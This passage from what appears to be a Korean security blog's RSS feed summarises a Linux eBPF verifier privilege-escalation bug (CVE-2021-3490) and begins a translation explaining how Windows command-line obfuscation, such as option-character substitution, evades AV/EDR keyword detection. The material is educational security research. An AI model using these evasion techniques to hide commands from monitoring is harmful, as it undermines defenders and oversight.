&#xBC30;&#xD3EC;&#xB41C; 2005&#xB144; &#xC774;&#xD6C4; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC545;&#xC6A9;&#xB418;&#xC9C0;&#xB294; &#xC54A;&#xC740; &#xAC83;&#xC73C;&#xB85C; &#xC54C;&#xB824;&#xC84C;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/kernel/">kernel</category>
      
      <category domain="https://hackyboiz.github.io/tags/samsung/">samsung</category>
      
      <category domain="https://hackyboiz.github.io/tags/buffer-overflow/">buffer overflow</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/printer-driver/">printer driver</category>
      
      
      <comments>https://hackyboiz.github.io/2021/08/03/l0ch/2021-08-03/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2021-3490: Kernel Pwning with eBPF: a Love Story</title>
      <link>https://hackyboiz.github.io/2021/08/02/fabu1ous/2021-08-02/</link>
      <guid>https://hackyboiz.github.io/2021/08/02/fabu1ous/2021-08-02/</guid>
      <pubDate>Mon, 02 Aug 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.graplsecurity.com/post/kernel-pwning-with-ebp</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.graplsecurity.com/post/kernel-pwning-with-ebpf-a-love-story">Kernel Pwning with eBPF: a Love Story</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Ubuntu 20.10</p><p>kernel 5.8.0-25.26 ~ 5.8.0-52.58</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>eBPF&#xB294; &#xB7F0;&#xD0C0;&#xC784; &#xC911; &#xC548;&#xC804;&#xD558;&#xAC8C; &#xCEE4;&#xB110; &#xCF54;&#xB4DC;&#xB97C; &#xC0BD;&#xC785;&#xD558;&#xAE30; &#xC704;&#xD574; Verifier&#xC640; BPF instruction&#xC744; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. Verifier&#xB294; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xC758; &#xAC12;&#xC758; &#xBCC0;&#xD654;&#xC640; &#xADF8; &#xAC12;&#xB4E4;&#xC758; &#xD5C8;&#xC6A9; &#xBC94;&#xC704;(&#xC774;&#xD558; range)&#xB4F1;&#xC744; &#xCD94;&#xC801;&#xD574; memory load&#xC640; store&#xC758; out-of-bound &#xC5EC;&#xBD80;&#xB97C; &#xAC80;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4;. 32-bit range&#xB97C; &#xAC16;&#xB294; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xC640; 64-bit range&#xB97C; &#xAC16;&#xB294; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB07C;&#xB9AC;&#xC758; Bitwise &#xC5F0;&#xC0B0;(BPF_AND, BPF_OR, BPF_XOR)&#xC774; &#xB05D;&#xB09C; &#xD6C4; &#xADF8;&#xC5D0; &#xB9DE;&#xAC8C; 32-bit range&#xB97C; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xD558;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xC624;&#xB958;&#xAC00; &#xBC1C;&#xC0DD;&#xD574; out-of-bound read/write&#xB97C; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs rust"><span class="hljs-keyword">static</span> void scalar_min_max_and(<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_reg_state</span></span> *dst_reg,                              <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_reg_state</span></span> *src_reg){    <span class="hljs-built_in">bool</span> src_known = tnum_is_const(src_reg-&gt;var_off);    <span class="hljs-built_in">bool</span> dst_known = tnum_is_const(dst_reg-&gt;var_off);    s64 smin_val = src_reg-&gt;smin_value;    <span class="hljs-built_in">u64</span> umin_val = src_reg-&gt;umin_value;    <span class="hljs-keyword">if</span> (src_known &amp;&amp; dst_known) {            __mark_reg_known(dst_reg, dst_reg-&gt;var_off.value);            <span class="hljs-keyword">return</span>;    }  ...}</code></pre>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/lpe/">lpe</category>
      
      <category domain="https://hackyboiz.github.io/tags/linux/">linux</category>
      
      <category domain="https://hackyboiz.github.io/tags/kernel/">kernel</category>
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/ebpf/">ebpf</category>
      
      
      <comments>https://hackyboiz.github.io/2021/08/02/fabu1ous/2021-08-02/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Translation] Windows Command-Line Obfuscation</title>
      <link>https://hackyboiz.github.io/2021/08/01/idioth/windows_cmd_obfuscation/</link>
      <guid>https://hackyboiz.github.io/2021/08/01/idioth/windows_cmd_obfuscation/</guid>
      <pubDate>Sun, 01 Aug 2021 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&amp;#xC548;&amp;#xB155;&amp;#xD558;&amp;#xC138;&amp;#xC694;. idioth &amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC6D0;&amp;#xB798; &amp;#xC624;&amp;#xB298;&amp;#xBD80;&amp;#xD130; Hooking&amp;#xC5</description>
        
      
      
      
      <content:encoded><![CDATA[<p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;. idioth &#xC785;&#xB2C8;&#xB2E4;. &#xC6D0;&#xB798; &#xC624;&#xB298;&#xBD80;&#xD130; Hooking&#xC5D0; &#xB300;&#xD55C; &#xC2DC;&#xB9AC;&#xC988;&#xB97C; &#xC9C4;&#xD589;&#xD558;&#xB824;&#xACE0; &#xD558;&#xC600;&#xC73C;&#xB098; &#xBAA8;&#xC544;&#xB454; &#xC790;&#xB8CC;&#xB97C; &#xCDE8;&#xD569;&#xD558;&#xACE0; &#xAD6C;&#xC0C1;&#xD558;&#xB358; &#xC911;&#xC5D0; &#xAF2C;&#xC5EC; &#xBC84;&#xB824;&#xC11C; &#xC77D;&#xC73C;&#xB824;&#xACE0; &#xAC00;&#xC838;&#xB2E4; &#xB193;&#xC558;&#xB358; &#xAC83; &#xC911; &#xD558;&#xB098;&#xB97C; &#xBC88;&#xC5ED;&#xD574;&#xC654;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC7A0;&#xAE50; &#xD734;&#xC2DD;&#xD558;&#xBA74;&#xC11C; &#xC2DC;&#xB9AC;&#xC988; &#xAD6C;&#xC0C1;&#xC744; &#xC81C;&#xB300;&#xB85C; &#xD558;&#xACE0; &#xC2DC;&#xC791;&#xD558;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><blockquote><p>&#xC6D0;&#xBB38; &#xAE00; : <a href="https://www.wietzebeukema.nl/blog/windows-command-line-obfuscation">Windows Command-Line Obfuscation</a></p></blockquote><p><strong>TL;DR</strong> - &#xB9CE;&#xC740; Windows &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC740; &#xD3B8;&#xC758;&#xC131;&#xC774;&#xB098; &#xD638;&#xD658;&#xC131;&#xC744; &#xC704;&#xD574; &#xAC19;&#xC740; command line&#xC744; &#xD45C;&#xD604;&#xD558;&#xB294; &#xC5EC;&#xB7EC; &#xAC00;&#xC9C0; &#xBC29;&#xBC95;&#xC774; &#xC788;&#xB2E4;. command-line &#xC778;&#xC790;&#xAC00; &#xC5EC;&#xB7EC; &#xAC00;&#xC9C0;&#xB85C; &#xD45C;&#xD604;&#xB418;&#xB2E4; &#xBCF4;&#xB2C8; &#xD2B9;&#xC815; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xD0D0;&#xC9C0;&#xD558;&#xAE30;&#xAC00; &#xB9E4;&#xC6B0; &#xC5B4;&#xB835;&#xB2E4;. &#xC774; &#xAC8C;&#xC2DC;&#xAE00;&#xC740; &#xC790;&#xC8FC; &#xC0AC;&#xC6A9;&#xB418;&#xB294; 40&#xAC1C; &#xC774;&#xC0C1;&#xC758; &#xAE30;&#xBCF8; Windows &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC774; command-line &#xB09C;&#xB3C5;&#xD654;&#xC5D0; &#xC5BC;&#xB9C8;&#xB098; &#xCDE8;&#xC57D;&#xD55C;&#xC9C0; &#xBCF4;&#xC5EC;&#xC8FC;&#xACE0; &#xB2E4;&#xB978; &#xC2E4;&#xD589; &#xD30C;&#xC77C;&#xC744; &#xBD84;&#xC11D;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xD234;&#xC744; &#xC18C;&#xAC1C;&#xD55C;&#xB2E4;.</p><h1 id="Command-line-arguments"><a href="#Command-line-arguments" class="headerlink" title="Command-line arguments"></a>Command-line arguments</h1><blockquote><p>He who wishes to be obeyed must know how to commad</p><ul><li>Machiavelli (Discourses on Livy III, Chapter XXII)</li></ul></blockquote><p>&#xCEF4;&#xD4E8;&#xD130;&#xC5D0;&#xAC8C;&#xB294; 16&#xC138;&#xAE30;&#xC758; &#xC774; &#xC778;&#xC6A9;&#xBB38;&#xC774; &#xB9CE;&#xC774; &#xC801;&#xC6A9;&#xB41C;&#xB2E4;. &#xB300;&#xBD80;&#xBD84;&#xC758; &#xC6B4;&#xC601;&#xCCB4;&#xC81C;&#xC640; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB294; &#xBD80;&#xBAA8; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; &#xC790;&#xC2DD; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0;&#xAC8C; &#xC815;&#xBCF4;&#xB97C; &#xC804;&#xB2EC;&#xD560; &#xC218; &#xC788;&#xB294; &#x2018;command line&#x2019; &#xAD6C;&#xC131;&#xC694;&#xC18C;&#xB97C; &#xAC00;&#xC9C4;&#xB2E4;. command line&#xC740; &#xC0C8;&#xB85C; &#xC0DD;&#xC131;&#xB41C; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xC73C;&#xBA70; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; &#xD750;&#xB984;&#xC744; &#xBC14;&#xAFC0; &#xC218; &#xC788;&#xB2E4;. &#xBA85;&#xB839;&#xC5B4; &#xC9D1;&#xD569;, &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xC2E4;&#xD589;, &#xC785;&#xB825; &#xAE30;&#xB2A5;&#xC740; &#xCEF4;&#xD4E8;&#xD130;&#xB97C; &#xB9CC;&#xB4DC;&#xB294; &#xD575;&#xC2EC; &#xAC1C;&#xB150;&#xC774;&#xB2E4;.</p><p>&#xCEF4;&#xD4E8;&#xD305;&#xC5D0; &#xB300;&#xD55C; &#xADFC;&#xBCF8;&#xC801;&#xC778; &#xC5ED;&#xD560;&#xC5D0;&#xB3C4; &#xBD88;&#xAD6C;&#xD558;&#xACE0; command line&#xC5D0;&#xC11C; &#xBCFC; &#xC218; &#xC788;&#xB294; &#xB2E4;&#xC591;&#xD55C; &#xBD80;&#xBD84;&#xC744; &#xC5B4;&#xB5BB;&#xAC8C; &#xBD88;&#xB7EC;&#xC57C;&#xD558;&#xB294; &#xC9C0;&#xC5D0; &#xB300;&#xD55C; &#xD569;&#xC758;&#xC810;&#xC774; &#xC5C6;&#xB2E4;. &#xC5B4;&#xB290; &#xBD80;&#xBD84;&#xC5D0;&#xC11C;&#xB294; command line arguments, parameters, options, flags, switches&#xAC00; &#xC11C;&#xB85C; &#xB2E4;&#xB978; &#xC758;&#xBBF8;&#xB97C; &#xAC16;&#xB294;&#xB2E4;&#xACE0; &#xD558;&#xC9C0;&#xB9CC; &#xC774; &#xAC8C;&#xC2DC;&#xAE00;&#xC5D0;&#xC11C;&#xB294; &#xB2E4;&#xC74C; &#xC6A9;&#xC5B4;&#xB97C; &#xC0AC;&#xC6A9;&#xD55C;&#xB2E4;.</p><p><img src="/2021/08/01/idioth/windows_cmd_obfuscation/Untitled.png" alt></p><p>&#xB77C;&#xC778; &#xC804;&#xCCB4;&#xAC00; command line&#xC774;&#xBA70; &#xACF5;&#xBC31;&#xC73C;&#xB85C; &#xC778;&#xC790;&#xAC00; &#xAD6C;&#xBD84;&#xB41C;&#xB2E4;. &#xBAA8;&#xB4E0; &#xC778;&#xC790;&#xB294; &#xC5ED;&#xD560;&#xC774; &#xB2E4;&#xB974;&#xB2E4;. &#xC608;&#xC2DC;&#xB85C; &#xCCAB; &#xBC88;&#xC9F8; &#xC778;&#xC790;&#xB294; &#xBCF4;&#xD1B5; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC774;&#xBA70; &#xBA85;&#xB839; &#xD504;&#xB86C;&#xD504;&#xD2B8;&#xC758; &#xACBD;&#xC6B0; &#xBA85;&#xB839;&#xC5B4;&#xAC00; &#xB41C;&#xB2E4;. &#xD2B9;&#xD788; &#xCC98;&#xC74C; &#xC138; &#xAC00;&#xC9C0;&#xB294; &#xC77C;&#xBC18;&#xC801;&#xC73C;&#xB85C; &#xD2B9;&#xC218; &#xBB38;&#xC790;&#xB85C; &#xC2DC;&#xC791;&#xD558;&#xB294; command line &#xC635;&#xC158;&#xC774;&#xB2E4;. &#xCC98;&#xC74C; &#xB450; &#xAC00;&#xC9C0; (<code>/f /unicode</code>)&#xB294; &#xD2B9;&#xBCC4;&#xD55C; &#xC785;&#xB825; &#xAC12;&#xC744; &#xC694;&#xD558;&#xC9C0; &#xC54A;&#xC73C;&#xBBC0;&#xB85C; switch&#xC774;&#xACE0; &#xC138; &#xBC88;&#xC9F8; &#xC778;&#xC790; (<code>/decode</code>)&#xB294; &#xB4A4;&#xC758; &#xC778;&#xC790; (<code>folder\encoded.b64</code>)&#xAC00; &#xC774; &#xC778;&#xC790;&#xC5D0; &#xB300;&#xD55C; &#xC785;&#xB825; &#xAC12;&#xC778; flag&#xC774;&#xB2E4;.</p><p><code>option char</code>&#xB294; command-line options&#xC5D0;&#xC11C; prefix&#xB85C; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xBB38;&#xC790;&#xC774;&#xB2E4;. Windows&#xC5D0;&#xC11C; &#xBCF4;&#xD1B5; &#xC2AC;&#xB798;&#xC2DC; (<code>/</code>)&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xBA70; &#xC720;&#xB2C9;&#xC2A4; &#xACC4;&#xC5F4; &#xC6B4;&#xC601;&#xCCB4;&#xC81C;&#xC5D0;&#xC11C;&#xB294; &#xD558;&#xC774;&#xD47C; (<code>-</code>)&#xC744; &#xC4F4;&#xB2E4;. command line&#xC740; &#xC2E4;&#xD589; &#xC911;&#xC778; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC5D0; &#xC758;&#xD574;&#xC11C; &#xAD6C;&#xBB38; &#xBD84;&#xC11D;&#xB418;&#xBBC0;&#xB85C; &#xAC1C;&#xBC1C;&#xC790;&#xB4E4;&#xC740; &#xC5B4;&#xB5A4; &#xD615;&#xC2DD;&#xC758; &#xC778;&#xC790;&#xB97C; &#xC804;&#xB2EC;&#xD574;&#xC57C; &#xD558;&#xB294;&#xC9C0;&#xC5D0; &#xB300;&#xD574;&#xC11C; &#xACE0;&#xBBFC;&#xD558;&#xC9C0; &#xC54A;&#xC544;&#xB3C4; &#xB41C;&#xB2E4;.</p><p>&#xCEF4;&#xD4E8;&#xD130; &#xC5ED;&#xC0AC;&#xC5D0;&#xC11C; &#xD45C;&#xC900;&#xD654;&#xAC00; &#xC774;&#xB8E8;&#xC5B4;&#xC9C0;&#xC9C0; &#xC54A;&#xC73C;&#xBA74; &#xB9E4;&#xC6B0; &#xD63C;&#xB780;&#xC2A4;&#xB7EC;&#xC6B4; &#xACBD;&#xC6B0;&#xAC00; &#xC788;&#xB294;&#xB370; command line&#xC5D0;&#xB3C4; &#xC801;&#xC6A9;&#xB41C;&#xB2E4;.</p><h1 id="&#xD638;&#xD658;&#xC131;-Compatibility"><a href="#&#xD638;&#xD658;&#xC131;-Compatibility" class="headerlink" title="&#xD638;&#xD658;&#xC131; (Compatibility)"></a>&#xD638;&#xD658;&#xC131; (Compatibility)</h1><p>command-line &#xAD6C;&#xBB38; &#xBD84;&#xC11D; &#xADDC;&#xCE59;&#xC5D0; &#xB300;&#xD55C; &#xD45C;&#xC900;&#xD654;&#xAC00; &#xBBF8;&#xD761;&#xD558;&#xC5EC; &#xB9CE;&#xC740; &#xC0AC;&#xC6A9;&#xC790;&#xC5D0;&#xAC8C; &#xD63C;&#xB780;&#xC744; &#xC720;&#xBC1C;&#xD55C;&#xB2E4;. &#xC0AC;&#xC6A9;&#xC790;&#xB97C; &#xB3D5;&#xAE30; &#xC704;&#xD574;&#xC11C; &#xBA87;&#xBA87; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC740; &#xB2E4;&#xC591;&#xD55C; &#xADDC;&#xCE59;&#xC774; &#xD5C8;&#xC6A9;&#xB418;&#xB3C4;&#xB85D; &#xC124;&#xACC4;&#xB418;&#xC5C8;&#xB2E4;. &#xC608;&#xC2DC;&#xB85C; &#xC2AC;&#xB798;&#xC2DC;&#xC640; &#xD558;&#xC774;&#xD47C;&#xC744; &#xC635;&#xC158; &#xBB38;&#xC790;&#xB85C; &#xBAA8;&#xB450; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xB2E4;. &#xC774;&#xC5D0; &#xB300;&#xD574;&#xC11C;&#xB294; &#xB2E4;&#xC74C; &#xBD80;&#xBD84;&#xC5D0;&#xC11C; &#xC790;&#xC138;&#xD788; &#xC124;&#xBA85;&#xD55C;&#xB2E4;.</p><p>&#xD63C;&#xB780;&#xC758; &#xB2E4;&#xB978; &#xC694;&#xC778;&#xC740; &#xB2E4;&#xC591;&#xD55C; &#xBB38;&#xC790;&#xC5F4; &#xC778;&#xCF54;&#xB529;&#xC774;&#xB2E4;. &#xC774;&#xB85C; &#xC778;&#xD574; &#xC624;&#xB798;&#xB41C; &#xD504;&#xB85C;&#xADF8;&#xB7A8; (&#xBCF4;&#xD1B5; ASCII&#xB9CC; &#xD5C8;&#xC6A9;)&#xACFC; &#xCD5C;&#xC2E0; &#xD504;&#xB85C;&#xADF8;&#xB7A8; (UTF-8&#xACFC; &#xC720;&#xB2C8;&#xCF54;&#xB4DC; &#xD5C8;&#xC6A9;) &#xAC04;&#xC758; &#xD638;&#xD658;&#xC131; &#xBB38;&#xC81C;&#xAC00; &#xBC1C;&#xC0DD;&#xD55C;&#xB2E4;. &#xC77C;&#xBD80; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC5D0;&#xC11C;&#xB294; &#xC774;&#xB7EC;&#xD55C; &#xBB38;&#xC81C;&#xB97C; &#xD2B9;&#xC815; &#xBB38;&#xC790; &#xD544;&#xD130;&#xB9C1;&#xC774;&#xB098; &#xD2B9;&#xC815; &#xBB38;&#xC790;&#xB97C; ASCII &#xBB38;&#xC790;&#xB85C; &#xBCC0;&#xD658;&#xD558;&#xC5EC; &#xD574;&#xACB0;&#xD558;&#xACE0;&#xC790; &#xD55C;&#xB2E4;.</p><p>&#xC774;&#xB97C; &#xD1B5;&#xD574;&#xC11C; &#xC77C;&#xBD80; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC5D0;&#xC11C; &#xC5EC;&#xB7EC; &#xAC1C;&#xC758; command line &#xC778;&#xC790;&#xB97C; &#xD558;&#xB098;&#xB85C; &#xB2E4;&#xB8E8;&#xB294; &#xBB38;&#xC81C;&#xAC00; &#xC0DD;&#xAE34;&#xB2E4;. &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0; &#xC804;&#xB2EC;&#xB41C; &#xB370;&#xC774;&#xD130;&#xAC00; &#xB2E4;&#xB984;&#xC5D0;&#xB3C4; &#xC2E4;&#xD589; &#xBC0F; &#xACB0;&#xACFC;&#xB294; &#xB3D9;&#xC77C;&#xD55C;&#xB370;, &#xC774;&#xB7F0; &#xC778;&#xC2A4;&#xD134;&#xC2A4;&#xB97C; synonymous command line&#xC774;&#xB77C;&#xACE0; &#xBD80;&#xB978;&#xB2E4;.</p><h1 id="&#xD0D0;&#xC9C0;-&#xBB38;&#xC81C;-Problems-for-detection"><a href="#&#xD0D0;&#xC9C0;-&#xBB38;&#xC81C;-Problems-for-detection" class="headerlink" title="&#xD0D0;&#xC9C0; &#xBB38;&#xC81C; (Problems for detection)"></a>&#xD0D0;&#xC9C0; &#xBB38;&#xC81C; (Problems for detection)</h1><p>&#xAC19;&#xC740; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xB2E4;&#xB978; &#xBC29;&#xBC95;&#xC73C;&#xB85C; &#xD45C;&#xD604;&#xD558;&#xB294; &#xAC83;&#xC740; &#xC77C;&#xBD80; &#xC0AC;&#xC6A9;&#xC790;&#xC5D0;&#xAC8C;&#xB294; &#xB3C4;&#xC6C0;&#xC774; &#xB418;&#xC9C0;&#xB9CC; &#xD0D0;&#xC9C0;&#xB098; &#xAC10;&#xC9C0;&#xB97C; &#xC5B4;&#xB835;&#xAC8C; &#xD55C;&#xB2E4;. &#xB300;&#xBD80;&#xBD84; &#xC704;&#xD611; &#xD0D0;&#xC9C0; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4; (AV, EDR &#xB4F1;)&#xB294; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xC2E4;&#xD589; &#xBC0F; command-line &#xC778;&#xC790;&#xC758; &#xC545;&#xC758;&#xC801; &#xC0AC;&#xC6A9;&#xC744; &#xAC10;&#xC2DC;&#xD55C;&#xB2E4;. &#xD574;&#xCEE4;&#xB294; &#xD0D0;&#xC9C0;&#xB97C; &#xD53C;&#xD558;&#xACE0; &#xC2F6;&#xC744; &#xAC83;&#xC774;&#xACE0; command line&#xC758; &#xC720;&#xC5F0;&#xC131;&#xC744; &#xD1B5;&#xD574; &#xD0D0;&#xC9C0;&#xB97C; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xB2E4;. &#xC774;&#xB294; &#xD0A4;&#xC6CC;&#xB4DC; &#xAE30;&#xBC18; &#xD0D0;&#xC9C0; &#xC6B0;&#xD68C;&#xBD80;&#xD130; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xB2E4; &#xB09C;&#xB3C5;&#xD654;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xAE4C;&#xC9C0; &#xB2E4;&#xC591;&#xD558;&#xB2E4;.</p><p>command-line &#xB09C;&#xB3C5;&#xD654;&#xC758; &#xC88B;&#xC740; &#xC608;&#xC2DC; &#xC911; &#xD558;&#xB098;&#xB294; Windows &#xBA85;&#xB839; &#xD504;&#xB86C;&#xD504;&#xD2B8; CMD&#xC5D0; &#xCD08;&#xC810;&#xC744; &#xB9DE;&#xCD98; Daniel Bohannon&#xC758; DOSfuscation [<a href="https://github.com/danielbohannon/Invoke-DOSfuscation">1</a>, <a href="https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/dosfuscation-report.pdf">2</a>]&#xC774;&#xB2E4;. &#xB09C;&#xB3C5;&#xD654;&#xB41C; &#xBA85;&#xB839;&#xC5B4;&#xB97C; CMD&#xAC00; &#xC774;&#xD574;&#xD558;&#xACE0; &#xC2E4;&#xD589;&#xD558;&#xB354;&#xB77C;&#xB3C4; &#xC0AC;&#xB78C;&#xC774; &#xC774;&#xD574;&#xD560; &#xC218; &#xC5C6;&#xC744; &#xC218; &#xC788;&#xACE0;, &#xBAA8;&#xB2C8;&#xD130;&#xB9C1; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4; &#xB610;&#xD55C; &#xD0D0;&#xC9C0;&#xD558;&#xC9C0; &#xBABB;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p><p>synonymous command line&#xC740; CMD &#xBFD0;&#xB9CC; &#xC544;&#xB2C8;&#xB77C; &#xB354; &#xB9CE;&#xC740; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC5D0; &#xC801;&#xC6A9;&#xB41C;&#xB2E4;. &#xC911;&#xC694;&#xD55C; &#xCC28;&#xC774;&#xC810;&#xC740; &#xBA85;&#xB839; &#xD504;&#xB86C;&#xD504;&#xD2B8;&#xAC00; &#xC544;&#xB2CC; &#xC2E4;&#xD589; &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xC790;&#xCCB4;&#xB97C; &#xC18D;&#xC774;&#xB294; &#xAC83;&#xC774;&#xB2E4;. &#xB4A4;&#xC5D0;&#xC11C; &#xC54C; &#xC218; &#xC788;&#xB4EF;&#xC774; DOSfuscation&#xC740; &#xD0D0;&#xC9C0; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xC5D0; &#xC758;&#xD574; &#xB09C;&#xB3C5;&#xD654;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xD615;&#xD0DC;&#xB85C; &#xB0A8;&#xC744; &#xC218; &#xC788;&#xC9C0;&#xB9CC; synonymous command line&#xC740; &#xADF8;&#xB807;&#xC9C0; &#xC54A;&#xB2E4;.</p><h1 id="Synonymous-command-lines-methods"><a href="#Synonymous-command-lines-methods" class="headerlink" title="Synonymous command lines: methods"></a>Synonymous command lines: methods</h1><p>&#xC2E4;&#xC81C;&#xB3C4; &#xC791;&#xB3D9;&#xD558;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xAE30; &#xC704;&#xD574; synonymous command line&#xC744; &#xC720;&#xBC1C;&#xD560; &#xC218; &#xC788;&#xB294; 5 &#xAC00;&#xC9C0; &#xBA54;&#xC11C;&#xB4DC;&#xB97C; &#xC0B4;&#xD3B4;&#xBCF4;&#xC790;.</p><h2 id="Option-Char-substitution"><a href="#Option-Char-substitution" class="headerlink" title="Option Char substitution"></a>Option Char substitution</h2><p>Windows &#xC2E4;&#xD589; &#xD30C;&#xC77C; <code>ping</code>&#xC744; &#xC0DD;&#xAC01;&#xD574;&#xBCF4;&#xC790;. &#xC6D0;&#xBCF8;&#xC774; &#xC720;&#xB2C9;&#xC2A4; &#xBC84;&#xC804;&#xC774;&#xBBC0;&#xB85C; command-line option&#xC5D0; &#xD558;&#xC774;&#xD47C;&#xC744; &#xC0AC;&#xC6A9;&#xD574;&#xC57C; &#xD55C;&#xB2E4;. ( e.g. <code>ping -n 127.0.0.1</code>) &#xC774;&#xAC83;&#xC740; &#xC2AC;&#xB798;&#xC2DC; (<code>/</code>)&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xB2E4;&#xB978; Windows command-line &#xD234;&#xACFC;&#xB294; &#xB2E4;&#xB974;&#xB2E4;. &#xC0AC;&#xC6A9;&#xC790;&#xC758; &#xD63C;&#xB780;&#xC744; &#xC904;&#xC774;&#xAE30; &#xC704;&#xD574; option character&#xB85C; &#xC2AC;&#xB798;&#xC2DC;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xAC83; (<code>ping /n 127.0.0.1</code>) &#xB610;&#xD55C; &#xD5C8;&#xC6A9;&#xD55C;&#xB2E4;.</p><p>&#xD558;&#xC774;&#xD47C;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xB300;&#xBD80;&#xBD84;&#xC758; &#xAE30;&#xBCF8; &#xB0B4;&#xC7A5; Windows &#xC2E4;&#xD589; &#xD30C;&#xC77C;&#xB4E4;&#xC740; &#xC2AC;&#xB798;&#xC2DC;&#xB3C4; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xC9C0;&#xB9CC;, &#xADF8; &#xBC18;&#xB300;&#xB294; &#xC544;&#xB2CC; &#xACBD;&#xC6B0;&#xAC00; &#xB9CE;&#xB2E4;. &#x2018;keyword&#x2019; &#xB2E8;&#xC5B4;&#xAC00; &#xD3EC;&#xD568;&#xB41C; &#xBAA8;&#xB4E0; &#xD30C;&#xC77C;&#xC744; &#xBCF4;&#xC5EC;&#xC8FC;&#xB294; <code>find /i keyword</code> &#xBA85;&#xB839;&#xC5B4;&#xB294; <code>find -i keyword</code>&#xB85C; &#xB3D9;&#xC791;&#xD558;&#xC9C0; &#xC54A;&#xB294;&#xB2E4;.</p><p>&#xC2AC;&#xB798;&#xC2DC;&#xC640; &#xD558;&#xC774;&#xD47C;&#xC774; &#xC77C;&#xBC18;&#xC801;&#xC73C;&#xB85C; &#xC0AC;&#xC6A9; &#xAC00;&#xB2A5;&#xD55C; &#xC635;&#xC158;&#xC774;&#xC9C0;&#xB9CC; &#xC77C;&#xBD80; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC740; &#xB354; &#xB9CE;&#xC740; option character&#xB97C; &#xC9C0;&#xC6D0;&#xD55C;&#xB2E4;. <code>certutil</code>&#xC740; &#xD558;&#xC774;&#xD47C;, &#xC2AC;&#xB798;&#xC2DC; &#xBFD0;&#xB9CC; &#xC544;&#xB2C8;&#xB77C; division slash (0x2215), fraction slash (0x2044) &#xAC19;&#xC740; 